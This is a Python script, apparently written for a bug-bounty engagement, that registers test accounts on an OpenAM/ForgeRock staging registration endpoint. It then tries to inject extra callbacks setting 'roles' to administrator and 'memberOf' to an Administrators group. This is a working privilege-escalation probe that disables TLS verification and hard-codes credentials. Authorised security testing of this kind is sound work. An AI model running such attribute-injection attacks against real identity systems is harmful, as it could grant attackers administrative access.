# -*- coding: utf-8 -*-
"""AIC 注册第二测试账号 + 属性注入探测
标准注册:用户名/givenName/sn/mail/密码/KBA/条款
属性注入:额外提交 roles/memberOf 等 callback,观察是否被接受
"""
import requests, urllib3, json
urllib3.disable_warnings()

BASE = 'https://openam-bug-bounty-stag.forgeblocks.com'
URL = BASE + '/am/json/realms/alpha/authenticate?authIndexType=service&authIndexValue=Registration'

S = requests.Session()
S.trust_env = False
S.proxies = {'http': None, 'https': None}
H = {'User-Agent': 'research-1643',
     'Accept-API-Version': 'resource=1.0, protocol=1.0',
     'Content-Type': 'application/json'}

def build_callbacks(d, username, mail, extra=None):
    cbs = []
    for cb in d.get('callbacks', []):
        t = cb['type']
        out = cb.get('output', [])
        inp = []
        if t == 'ValidatedCreateUsernameCallback':
            inp = [{'name': 'IDToken1', 'value': username}]
        elif t == 'StringAttributeInputCallback':
            nm = next((o['value'] for o in out if o['name'] == 'name'), '')
            if nm == 'givenName':
                inp = [{'name': 'IDToken2', 'value': 'Qoder'}]
            elif nm == 'sn':
                inp = [{'name': 'IDToken3', 'value': 'Researcher'}]
            else:
                inp = [{'name': 'IDToken4', 'value': mail}]
        elif t == 'BooleanAttributeInputCallback':
            nm = next((o['value'] for o in out if o['name'] == 'name'), '')
            idx = 'IDToken5' if nm == 'preferences/marketing' else 'IDToken6'
            inp = [{'name': idx, 'value': False}]
        elif t == 'ValidatedCreatePasswordCallback':
            inp = [{'name': 'IDToken7', 'value': 'Agent360User$5h2!QxR'}]
        elif t == 'KbaCreateCallback':
            inp = [{'name': 'IDToken8question', 'value': "What's your favorite color?"},
                   {'name': 'IDToken8answer', 'value': 'blue'}]
        elif t == 'TermsAndConditionsCallback':
            inp = [{'name': 'IDToken9', 'value': True}]
        else:
            inp = [{'name': k.get('name'), 'value': k.get('value')} for k in cb.get('input', [])]
        cbs.append({'type': t, 'output': out, 'input': inp, '_id': cb.get('_id')})
    if extra:
        for e in extra:
            cbs.append(e)
    return cbs

def show_failed(d2):
    """打印响应所有 callbacks 的类型与关键输出"""
    for cb in d2.get('callbacks', []):
        t = cb['type']
        outs = {o['name']: o['value'] for o in cb.get('output', [])}
        fp = outs.get('failedPolicies')
        nm = outs.get('name') or outs.get('prompt') or outs.get('message') or ''
        if fp:
            print('    FAIL %s (%s): %s' % (t, nm, json.dumps(fp)[:250]))
        else:
            print('    CB   %s (%s)' % (t, nm))
            for o in cb.get('output', []):
                v = o.get('value')
                if isinstance(v, str) and len(v) > 3:
                    print('         %s = %s' % (o['name'], v[:300]))
    # 非 callbacks 字段
    for k, v in d2.items():
        if k not in ('callbacks', 'authId'):
            print('    EXTRA %s = %s' % (k, json.dumps(v)[:200]))

def reg(username, mail, extra=None):
    r = S.post(URL, json={}, timeout=15, verify=False, headers=H)
    d = r.json()
    authId = d.get('authId')
    cbs = build_callbacks(d, username, mail, extra)
    r2 = S.post(URL, json={'authId': authId, 'callbacks': cbs}, timeout=15, verify=False, headers=H)
    d2 = r2.json()
    print('  reg %s -> %d token=%s' % (username, r2.status_code,
          d2.get('tokenId', 'NONE')[:60] if d2.get('tokenId') else 'NONE'))
    if not d2.get('tokenId'):
        show_failed(d2)

print('=== 1. 标准注册 ===')
tok = reg('researcher1643', '1643584176@wearehackerone.com')

print('=== 2. 属性注入注册 (roles/memberOf) ===')
extra_cbs = [
    {'type': 'StringAttributeInputCallback', 'output': [{'name': 'name', 'value': 'roles'},
                                                        {'name': 'prompt', 'value': 'roles'},
                                                        {'name': 'required', 'value': False},
                                                        {'name': 'policies', 'value': {}}], 'input': [{'name': 'IDToken99', 'value': 'administrator'}]},
    {'type': 'StringAttributeInputCallback', 'output': [{'name': 'name', 'value': 'memberOf'},
                                                        {'name': 'prompt', 'value': 'memberOf'},
                                                        {'name': 'required', 'value': False},
                                                        {'name': 'policies', 'value': {}}], 'input': [{'name': 'IDToken98', 'value': 'cn=Administrators,ou=groups,dc=example,dc=com'}]},
]
reg('researcher1643b', '1643584176+2@wearehackerone.com', extra_cbs)
